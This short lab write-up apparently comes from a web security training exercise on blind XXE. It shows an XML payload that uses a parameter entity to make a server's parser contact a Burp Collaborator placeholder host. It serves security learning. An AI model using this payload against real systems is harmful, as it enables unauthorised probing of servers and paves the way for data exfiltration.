Title: Blind XXE with out-of-band interaction via XML parameter entities
Level: Practitioner 
Desc:  This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 


Below you can find XML Parameter Entity
```
<!DOCTYPE stockCheck [
 <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">
 %xxe; ]>
```
